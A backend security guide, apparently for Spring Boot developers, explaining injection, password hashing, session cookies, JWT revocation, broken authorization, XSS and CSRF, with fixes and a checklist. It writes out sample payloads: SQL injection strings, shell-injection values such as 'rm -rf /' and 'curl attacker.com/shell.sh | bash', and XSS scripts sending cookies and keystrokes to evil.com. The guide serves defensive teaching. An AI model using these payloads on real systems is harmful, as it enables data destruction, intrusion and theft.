# Backend Security — Complete Guide

## I. The Security Mindset: Thinking Like an Attacker

Security is not a checklist — it is a **mindset of paranoia**. Before writing a single line of defensive code, you must learn to ask the same question an attacker asks.

### The Attacker's Core Question

> **"Where did the developer make an assumption?"**

```
Developer assumption                  What an attacker does with it
────────────────────────────────      ──────────────────────────────
"Users will only send valid input"  → Sends malformed / malicious input
"Requests come from my frontend"    → Makes direct HTTP calls to your API
"Nobody will inspect the network"   → Opens DevTools → reads tokens, endpoints
"That URL is hidden so it's safe"   → Guesses or enumerates the URL
"The ID in the URL is just a hint"  → Changes /invoices/5 to /invoices/6
"Admins are the only ones who know" → Finds the admin route in JS bundle
```

### The Concept of Boundaries

Most security vulnerabilities occur at the moment **data crosses a boundary** — moving from one context where it is safe into another where it can be executed or interpreted.

```
Dangerous boundaries:

  Browser input ──────────────────► Database query
  (user's text)   SQL boundary         (executes text as SQL) ← SQLi

  User's text ────────────────────► HTML page
  (markdown/HTML)  HTML boundary       (executes text as JS)  ← XSS

  Web form ───────────────────────► OS command
  (filename field) Shell boundary      (executes text as shell) ← Command injection

  Attacker's site ────────────────► Your API
  (forged request) Origin boundary     (executes with user's cookies) ← CSRF
```

> **Rule of thumb:** Every time data moves from user-controlled territory into a system that interprets or executes it — sanitize, parameterize, or escape it. Trust nothing that crosses a boundary.

### The Default Deny Principle

```
❌ Default Allow (dangerous):
   "Everything is permitted unless explicitly blocked"
   → Attacker finds one thing you forgot to block ❌

✅ Default Deny (safe):
   "Everything is blocked unless explicitly permitted"
   → Attacker finds nothing works by default
   → You only open what you consciously choose to allow ✅
```

Apply this everywhere: routes, roles, file types, API endpoints, database permissions.

---

## II. Injection Attacks: When Data Becomes Code

Injection is the #1 class of web vulnerabilities. It occurs when a system **confuses untrusted user data with executable instructions**.

### SQL Injection (SQLi)

Happens when user input is directly concatenated into a SQL string — the database cannot distinguish the developer's query from the attacker's payload.

```
Vulnerable login query (string concatenation):

  query = "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'";

  Normal user input:
    email:    alice@example.com
    password: hunter2
    Query:    SELECT * FROM users WHERE email = 'alice@example.com' AND password = 'hunter2'
    Result:   login check works as intended ✅

  Attacker input:
    email:    ' OR 1=1 --
    password: anything
    Query:    SELECT * FROM users WHERE email = '' OR 1=1 --' AND password = 'anything'
                                                   ────────  ──
                                                   always    comments out
                                                   true      the rest
    Result:   returns ALL users → attacker is logged in as first user ❌
```

**More destructive payloads:**

```sql
-- Dump entire users table
' UNION SELECT email, password, null FROM users --

-- Drop the database
'; DROP TABLE users; --

-- Read files from the server
' UNION SELECT load_file('/etc/passwd') --
```

#### The Fix: Parameterized Queries (Prepared Statements)

User input is passed as a **separate parameter** — the database driver never allows it to be interpreted as SQL syntax.

```
❌ Vulnerable — string concatenation:
   String sql = "SELECT * FROM users WHERE email = '" + email + "'";

✅ Safe — parameterized:
   String sql = "SELECT * FROM users WHERE email = ?";
   jdbcTemplate.queryForObject(sql, userRowMapper, email);

   Attacker inputs:  ' OR 1=1 --
   Database sees:    email = "' OR 1=1 --"   ← treated as a literal string
   Result:           no rows match → login fails safely ✅
```

```java
// Spring Data JPA — parameterized by default, never vulnerable
Optional<User> findByEmailAndPassword(String email, String hashedPassword);

// JdbcTemplate — explicit parameterization with ?
@Query("SELECT u FROM User u WHERE u.email = :email")
Optional<User> findByEmail(@Param("email") String email);
```

> **Rule:** User input is always data. It is never part of the command. Parameterized queries enforce this at the driver level — no exceptions, no workarounds.

---

### Command Injection

The same principle as SQLi, but targeting the **Operating System shell** instead of the database.

```
Vulnerable — user input passed to a shell:

  String cmd = "convert " + userFilename + " output.pdf";
  Runtime.exec(cmd);

  Normal input:    photo.jpg
  Command runs:    convert photo.jpg output.pdf ✅

  Attacker input:  photo.jpg; rm -rf /
  Command runs:    convert photo.jpg; rm -rf /
                                      ─────────
                                      deletes entire filesystem ❌

  Other payloads:
    photo.jpg; cat /etc/passwd > /var/www/html/leak.txt
    photo.jpg; curl attacker.com/shell.sh | bash
```

#### The Fix: Bypass the Shell Entirely

Pass arguments as an **array** directly to the process — no shell interpreter is involved, so `;`, `|`, `&&` are never treated as control characters.

```java
// ❌ Vulnerable — goes through shell
Runtime.getRuntime().exec("convert " + userFilename + " output.pdf");

// ✅ Safe — array bypasses shell, each element is a literal argument
ProcessBuilder pb = new ProcessBuilder(
    "convert",
    userFilename,    // treated as a plain string, never parsed as a command
    "output.pdf"
);
pb.start();

// Additionally — validate the filename before use:
if (!userFilename.matches("^[a-zA-Z0-9_\\-]+\\.(jpg|png|gif)$")) {
    throw new ValidationException("Invalid filename");
}
```

---

## III. Password Storage and Authentication Security

### Password Storage

The goal is to make stolen credentials **computationally useless**.

```
Evolution of password storage (worst to best):

  ❌ Plain text:       "hunter2"
     → Database breach → instant access to every account ❌

  ❌ Simple hash:      SHA256("hunter2") = "f52fbd..."
     → Rainbow table lookup → cracked in milliseconds ❌
     (attacker precomputes hashes for millions of common passwords)

  ❌ Hashed + shared salt: SHA256("SALT" + "hunter2")
     → All identical passwords still produce identical hashes
     → One crack exposes all users with the same password ❌

  ✅ Salted + slow hash:  Argon2id(salt="x7k2m...", password="hunter2")
     → Unique salt per user → identical passwords produce different hashes ✅
     → Algorithm is deliberately slow → GPU brute force takes years ✅
```

#### Salting

A **unique, random string** appended to each password before hashing. Defeats precomputed rainbow table attacks.

```
User A: password = "hunter2"   salt = "x7k2mQ"  → hash("x7k2mQhunter2") = "a3f9..."
User B: password = "hunter2"   salt = "p9nR4w"  → hash("p9nR4whunter2") = "b7c2..."
                  ──────────                                                ─────────
                  same password                                            different hashes ✅

Attacker steals DB, cracks User A's hash:
  → learns: "x7k2mQ" + "hunter2" → "a3f9..."
  → User B's hash is different → must crack separately ✅
```

#### Slow Hashing Algorithms

Deliberately CPU/memory-intensive to make brute-force attacks impractically slow.

| Algorithm | Status | Notes |
|---|---|---|
| Argon2id | ✅ Recommended | Winner of Password Hashing Competition, memory-hard |
| BCrypt | ✅ Acceptable | Widely supported, adjustable work factor |
| SCrypt | ✅ Acceptable | Memory-hard, good alternative |
| PBKDF2 | ⚠️ Acceptable | FIPS-compliant but GPU-attackable |
| SHA-256 / MD5 | ❌ Never | Fast by design — trivial to brute force |

```java
// Spring Security — BCrypt (automatic salting, slow hashing)
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12);  // work factor 12 — adjust for your hardware
}

// Storing
String hashed = passwordEncoder.encode(plainTextPassword);
user.setPassword(hashed);

// Verifying (never compare plain text directly)
boolean valid = passwordEncoder.matches(inputPassword, user.getPassword());
```

---

### Session Security: Cookie Flags

Three flags that together protect session cookies from the most common theft vectors.

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax

              ────────────  ─────────  ──────  ─────────────
              session token   (1)        (2)       (3)
```

#### (1) HttpOnly — Blocks JavaScript Access

```
Without HttpOnly:
  document.cookie  →  "sessionId=abc123"   ← XSS attack reads the token ❌
  Attacker sends token to their server → full session hijack

With HttpOnly:
  document.cookie  →  ""   ← browser refuses to expose it to JS ✅
  XSS can still run but cannot steal the session token
```

#### (2) Secure — HTTPS Only

```
Without Secure:
  Cookie sent over HTTP → visible in plain text on the network ❌
  Any network observer (café Wi-Fi, ISP) can steal it

With Secure:
  Cookie only sent over HTTPS → encrypted in transit ✅
  Dropped silently on HTTP requests
```

#### (3) SameSite — CSRF Protection

```
Without SameSite:
  User is logged in to bank.com
  Attacker's site makes: POST bank.com/transfer?to=attacker&amount=1000
  Browser attaches bank.com session cookie automatically ❌ ← CSRF

SameSite=Lax (modern default):
  Cookie sent on same-site requests ✅
  Cookie sent on top-level navigations (clicking a link) ✅
  Cookie NOT sent on cross-site POST requests ✅ ← CSRF blocked

SameSite=Strict:
  Cookie only sent on same-site requests
  Clicking a link from another site → cookie not sent (very restrictive)
```

---

### JWT Vulnerabilities and Fixes

JWTs are stateless — the server does not track issued tokens. This creates a revocation problem.

```
JWT lifecycle — the revocation gap:

  User logs in → JWT issued (expires in 1 hour)
       │
  Minute 5: User's device is stolen
       │
  Minute 5: User clicks "log out all devices"
       │
  Server has no record of the token → cannot invalidate it
       │
  Attacker uses stolen JWT for 55 more minutes ❌
```

#### The Fix: Short-Lived Access Tokens + Refresh Tokens

```
Access token:   expires in 15 minutes  ← short window limits damage
Refresh token:  expires in 7 days      ← stored server-side, can be revoked

Flow:
  Login → issue access token (15m) + refresh token (7d, stored in DB)
       │
  API calls use access token (15m)
       │
  Token expires → client sends refresh token → server validates against DB
       │
  ┌────┴────┐
Valid    Revoked
  │          │
  ▼          ▼
Issue     401 Unauthorized
new       → user must log in again ✅
access
token ✅

Device stolen → revoke refresh token in DB
→ next refresh attempt fails → attacker locked out within 15 minutes ✅
```

```java
// Short-lived access token
String accessToken = Jwts.builder()
    .setSubject(userId)
    .setExpiration(Date.from(Instant.now().plusSeconds(900)))  // 15 minutes
    .signWith(secretKey)
    .compact();

// Refresh token stored in DB (can be revoked)
RefreshToken refreshToken = new RefreshToken();
refreshToken.setUserId(userId);
refreshToken.setToken(UUID.randomUUID().toString());
refreshToken.setExpiresAt(Instant.now().plus(7, ChronoUnit.DAYS));
refreshTokenRepository.save(refreshToken);
```

---

## IV. Authorization Failures

Authentication answers "Who are you?" Authorization answers **"What are you allowed to do?"** — failures here lead to privilege escalation and data leakage.

### BOLA — Broken Object Level Authorization

The most common authorization failure. A user changes an ID in a URL or request body to access a resource that belongs to someone else.

```
Normal request:
  GET /api/invoices/5
  User ID: 101   →   Invoice 5 belongs to User 101 ✅

Attacker changes the ID:
  GET /api/invoices/6
  User ID: 101   →   Invoice 6 belongs to User 102

  ❌ Vulnerable — fetches by ID only:
     SELECT * FROM invoices WHERE id = 6
     → returns User 102's invoice to User 101 ❌

  ✅ Fixed — always scope to the authenticated user:
     SELECT * FROM invoices WHERE id = 6 AND user_id = 101
     → no rows returned → 404 Not Found ✅
     → attacker learns nothing about invoice 6
```

```java
// ❌ Vulnerable — trusts the ID alone
@GetMapping("/invoices/{id}")
public Invoice getInvoice(@PathVariable Long id) {
    return invoiceRepository.findById(id)
        .orElseThrow(() -> new NotFoundException("Invoice not found"));
}

// ✅ Fixed — scopes to authenticated user
@GetMapping("/invoices/{id}")
public Invoice getInvoice(@PathVariable Long id, @AuthenticationPrincipal User user) {
    return invoiceRepository.findByIdAndUserId(id, user.getId())
        .orElseThrow(() -> new NotFoundException("Invoice not found"));
    //              ───────────────────────────
    //              ownership verified in the query — not just the ID ✅
}
```

---

### BFLA — Broken Function Level Authorization

A regular user accesses **admin-only functionality** because the route exists but has no role check.

```
Admin panel routes:
  DELETE /api/admin/users/:id      ← no role check ❌
  POST   /api/admin/refund-all     ← no role check ❌
  GET    /api/admin/export-users   ← no role check ❌

Attacker:
  → Finds routes in the JavaScript bundle, Swagger docs, or by guessing
  → Calls DELETE /api/admin/users/42 as a regular user
  → Succeeds because no RBAC middleware is present ❌
```

#### The Fix: RBAC Middleware on Every Sensitive Route

```
Default Deny applied to roles:

  Request arrives at /api/admin/users
         │
         ▼
  Authentication check: valid token? ✅
         │
         ▼
  Authorization check: role = ADMIN?
         │
    ┌────┴────┐
   Yes        No
    │          │
    ▼          ▼
  Proceed    403 Forbidden ✅
             (even if they know the URL)
```

```java
// Role enum
public enum Role { USER, MODERATOR, ADMIN }

// RBAC middleware in Spring Security
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.authorizeHttpRequests(auth -> auth
            .requestMatchers("/api/admin/**").hasRole("ADMIN")     // admin only
            .requestMatchers("/api/mod/**").hasAnyRole("MOD", "ADMIN")
            .requestMatchers("/api/user/**").hasRole("USER")
            .anyRequest().authenticated()                          // default deny ✅
        );
        return http.build();
    }
}

// Method-level check (defense in depth)
@DeleteMapping("/admin/users/{id}")
@PreAuthorize("hasRole('ADMIN')")
public void deleteUser(@PathVariable Long id) {
    userService.delete(id);
}
```

---

## V. Client-Side Threats

### XSS — Cross-Site Scripting

Malicious JavaScript is **injected into your page** and executed in other users' browsers — giving the attacker full control over those sessions.

```
Stored XSS attack (via a comment field):

  Attacker posts a comment:
    "Great article! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>"

  Your app stores this in the database and renders it:
    <div class="comment">
      Great article!
      <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
    </div>

  Every user who views the page:
    → Browser executes the script ❌
    → Session cookie sent to attacker's server
    → Full account takeover for every viewer ❌
```

**Other XSS payloads:**

```javascript
// Redirect to a phishing page
window.location = "https://evil.com/fake-login";

// Keylog every keystroke
document.onkeypress = e => fetch('https://evil.com/keys?k=' + e.key);

// Modify page content (fake deposit confirmation)
document.getElementById('balance').innerText = '$1,000,000';
```

#### The Fix 1: Sanitize User-Provided HTML

```
Never render raw user input as HTML.

❌ Dangerous:
   element.innerHTML = userComment;         // executes any script tags
   <div th:utext="${comment}"></div>        // Thymeleaf unescaped

✅ Safe — escape HTML entities:
   element.textContent = userComment;       // renders as text, never executed
   <div th:text="${comment}"></div>         // Thymeleaf escaped (default)

   < → &lt;    > → &gt;    " → &quot;    ' → &#x27;

   Attacker's payload after escaping:
   &lt;script&gt;...&lt;/script&gt;        ← displayed as text, never runs ✅
```

If users must submit rich HTML (e.g., a WYSIWYG editor), use an allowlist sanitizer:

```java
// OWASP Java HTML Sanitizer — allowlist only safe tags
PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
String safeHtml = policy.sanitize(userHtml);
// <b>, <i>, <a> allowed — <script>, <img onerror=...> stripped ✅
```

#### The Fix 2: Content Security Policy (CSP)

A response header that tells the browser **which scripts are allowed to execute** — even if XSS injection succeeds, the script is blocked.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

  default-src 'self'  →  only load resources from your own origin
  script-src 'self'   →  only execute scripts from your own domain

  Injected script:  <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
  CSP blocks it:    evil.com is not in the allowlist → script refused to execute ✅
```

---

### CSRF — Cross-Site Request Forgery

A malicious site tricks a **logged-in user's browser** into making an unwanted request to your server — using their session cookie automatically.

```
Attack flow:

  User is logged in to bank.com (session cookie exists)
         │
  User visits evil.com (attacker-controlled page)
         │
  evil.com's page contains:
    <img src="https://bank.com/transfer?to=attacker&amount=1000">
    or
    <form action="https://bank.com/transfer" method="POST">...autosubmit
         │
  Browser makes the request to bank.com
         │
  Browser automatically attaches bank.com session cookie ❌
         │
  Transfer executes as the victim ❌
```

#### Modern Defense: SameSite=Lax (Default in Modern Browsers)

```
SameSite=Lax (now the browser default):
  → Cookie not sent on cross-site POST requests
  → evil.com's form POST to bank.com → cookie not attached → request rejected ✅
  → Most CSRF attacks defeated by default

For older clients or extra hardness: CSRF tokens
  → Server generates an unguessable token per session
  → Token embedded in every form
  → Server validates token on every state-changing request
  → Attacker cannot forge the token from another origin ✅
```

---

## VI. Resources for Going Deeper

| Resource | What It Offers |
|---|---|
| [PortSwigger Web Security Academy](https://portswigger.net/web-security) | Free hands-on labs — practice attacking and defending in a safe environment |
| [OWASP Top 10](https://owasp.org/www-project-top-ten/) | Industry-standard list of the 10 most critical web application risks |
| [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/) | Technical implementation guidance for specific security controls |
| [HackTheBox](https://www.hackthebox.com/) | CTF-style labs for practising real-world attack and defense techniques |

---

## VII. Spring Boot Security Quick Reference

```java
@Configuration
@EnableMethodSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // Default deny — nothing open unless explicitly permitted
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            // Cookie security
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            // CSRF — enabled by default in Spring Security
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            )
            // Security headers including CSP
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'; script-src 'self'")
                )
            );
        return http.build();
    }

    // Slow password hashing — BCrypt work factor 12
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12);
    }
}
```

---

## VIII. Quick Reference Checklist

| Threat | Attack Vector | Fix |
|---|---|---|
| SQL Injection | User input in SQL strings | Parameterized queries — always, no exceptions |
| Command Injection | User input in shell commands | Array-based process execution, bypass shell |
| Weak passwords | Brute force / credential stuffing | BCrypt / Argon2id with salt, enforce complexity |
| Rainbow tables | Precomputed hash lookup | Unique salt per user (BCrypt handles automatically) |
| Session hijacking via XSS | JS reads cookie | `HttpOnly` cookie flag |
| Session over HTTP | Network sniffing | `Secure` cookie flag |
| CSRF | Cross-site state-changing requests | `SameSite=Lax` + CSRF tokens |
| BOLA | ID manipulation in URL/body | Always scope queries: `WHERE id = ? AND user_id = ?` |
| BFLA | Accessing admin routes directly | RBAC middleware on every sensitive route |
| XSS (stored/reflected) | Injected script in user content | Escape output + allowlist HTML sanitizer |
| XSS script execution | Even after injection | Content Security Policy (CSP) header |
| JWT revocation gap | Stolen long-lived token | Short-lived access tokens (15m) + revocable refresh tokens |
| Hardcoded secrets | Source code / Git history | Environment variables + Secret Manager |
| Overprivileged access | Broad permissions | Principle of Least Privilege + Default Deny |
| Missing role checks | Hidden but accessible routes | `@PreAuthorize` + `SecurityFilterChain` on all routes |